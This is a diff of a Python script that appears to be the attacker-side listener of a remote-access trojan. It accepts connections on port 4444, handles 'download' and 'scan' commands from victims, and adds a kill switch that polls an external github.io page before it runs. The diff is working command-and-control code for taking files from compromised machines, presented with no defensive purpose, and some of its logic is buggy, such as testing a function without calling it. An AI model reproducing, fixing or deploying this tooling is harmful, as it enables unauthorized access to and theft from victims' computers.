@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
+from os import stat
 import socket
 import json
 import base64
+import sys
 import requests
 import re
 class Listener():
@@ -44,7 +46,7 @@ class Listener():
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
             return encoded_file
-    def recv_scan_result(self):
+    def recv_scan_result(self, content):
         scan_result = base64.b64decode(content)
         if "Keyboard" and "Resolve" and "Server" not in scan_result:
             with open("scan_result.txt", "w") as f:
@@ -64,19 +66,30 @@ class Listener():
                 if cmd[0] == "download" and "[-] Error " not in result:
                     result = self.download_file(cmd[1], result)
                 if cmd[0] == "scan":
-                    result = self.recv_scan_result
+                    result = self.recv_scan_result(result)
             except Exception:
                 result = "[-] Error during command execution."
             print (result)
 
+def get_status():
+    s = requests.get('https://poggerpussy.github.io').text
+    #status = re.sub(r"<.*?>",'', s)
+    if s == "true":
+        print(s)
+        return True
+    return False
 
-s = requests.get('https://www.poggerpussy.github.io').text
-status = re.sub(r"<.*?>",'', s)
-print (status)
-try:
-    if status == "true":
-        app = Listener("0.0.0.0", 4444)
-        app.run()
-except Exception as e:
-    print (e)
-    pass
+while True:
+    try:
+        if get_status:
+            app = Listener("0.0.0.0", 4444)
+            app.run()
+            print(Listener.connection)
+            
+    except Exception as e:
+        print(e)
+        continue
+    except KeyboardInterrupt:
+        print ("Exiting program")
+        sys.exit()
+
